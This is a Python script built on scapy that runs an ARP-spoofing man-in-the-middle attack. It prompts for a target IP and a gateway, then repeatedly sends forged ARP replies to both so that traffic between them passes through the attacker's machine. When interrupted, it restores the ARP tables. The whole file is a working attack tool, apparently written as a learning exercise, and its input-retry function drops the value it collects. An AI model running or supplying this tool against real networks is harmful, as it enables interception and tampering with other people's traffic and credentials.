import scapy.all as scapy
import subprocess
import time

# op: Se envia como ARP res no ARP req al ser 2
# pdst: IP de target
# hwdst: MAC address de target
# psrc: Default gateway
# hwsrc: Default gateway MAC address


def get_input():
    target_ip = input("[+]Target IP: ")
    default_gateway = input("[+]Default gateway: ")
    if target_ip and default_gateway:
        return target_ip, default_gateway
    else:
        print("[-]Invalid data try again")
        get_input()


def get_target_MAC(target_ip):
    arp_req = scapy.ARP(pdst=target_ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast / arp_req
    answer_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
    if len(answer_list) > 0:
        found_target = answer_list[0]
        return found_target[0][1].hwsrc
    else:
        print("MAC address not found")


def spoof(target_ip, default_gateway):
    target_MAC = get_target_MAC(target_ip)
    new_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_MAC, psrc=default_gateway)
    scapy.send(new_packet, verbose=False)


def restore_arp_table(target_ip, default_gateway):
    target_MAC = get_target_MAC(target_ip)
    default_gateway_MAC = get_target_MAC(target_ip=default_gateway)
    new_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_MAC, psrc=default_gateway, hwsrc=default_gateway_MAC)
    scapy.send(new_packet, count=5, verbose=False)


target_ip, default_gateway = get_input()
sent_packets_count = 0

try:
    while True:
        # send packet to client
        spoof(target_ip, default_gateway)

        # send packet to router
        spoof(default_gateway, target_ip)

        sent_packets_count += 2
        print(f"\r[+]Packets sent {sent_packets_count}", end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+]Quitting...")
    print("[+]Restoring arp table for target, please wait...")
    restore_arp_table(target_ip, default_gateway)
    restore_arp_table(default_gateway, target_ip)
    print("[+]Done")
